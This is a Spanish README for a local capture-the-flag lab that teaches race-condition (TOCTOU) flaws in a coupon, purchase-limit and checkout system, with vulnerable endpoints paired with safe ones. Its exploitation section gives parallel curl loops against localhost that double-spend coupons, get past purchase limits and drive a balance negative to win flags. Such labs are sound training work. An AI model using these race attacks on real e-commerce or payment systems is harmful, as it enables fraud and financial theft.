# Lab race-condition

Room: **race-condition** (NUEVA — WebApp Pentesting). Sistema de cupones con TOCTOU.

## Uso

```bash
cp flags.env.example flags.env   # editar flags
docker compose --env-file flags.env up -d
# http://127.0.0.1:18099
```

## Endpoints

| URL | Descripción | Vulnerable |
|---|---|---|
| `/status` | Balance y estadísticas | — |
| `/redeem?code=X` | Canjear cupón (WELCOME10, MEGA50) | ✅ sí (check-then-act sin lock) |
| `/redeem-safe?code=X` | Canjear (comparación segura) | ❌ no (con lock) |
| `/buy` | Comprar (máx 3/día) | ✅ sí (límite TOCTOU) |
| `/buy-safe` | Comprar (comparación segura) | ❌ no |
| `/checkout` | Pagar vía gateway | ✅ sí (balance TOCTOU) |
| `/checkout-safe` | Pagar (comparación segura) | ❌ no |
| `/achievements` | Ver logros desbloqueados | — |
| `/reset` | Reiniciar estado para reintentar | — |

## Cómo explotar (los 3 requieren PARALELISMO real)

```bash
# 1. Double-spend — canjear el mismo cupón 5+ veces:
for i in $(seq 1 15); do curl "http://127.0.0.1:18099/redeem?code=WELCOME10" & done; wait

# 2. Bypass del límite de compras (30 requests para pasar la barrera de max+10):
for i in $(seq 1 30); do curl "http://127.0.0.1:18099/buy" & done; wait

# 3. Balance negativo — el check de balance sufre TOCTOU:
for i in $(seq 1 30); do curl "http://127.0.0.1:18099/checkout" & done; wait
```

## Flags

| Flag | Cómo se obtiene | Posible secuencial? |
|---|---|---|
| FLAG_1 | Cupón canjeado 5+ veces (double spend) | ❌ |
| FLAG_2 | purchases > max+10 (13) | ❌ |
| FLAG_3 | balance < 0 vía /checkout | ❌ |

Nota: el servidor es `ThreadingHTTPServer` — sin threads no habría carrera.

## Puertos

`127.0.0.1:18099` → contenedor 8080
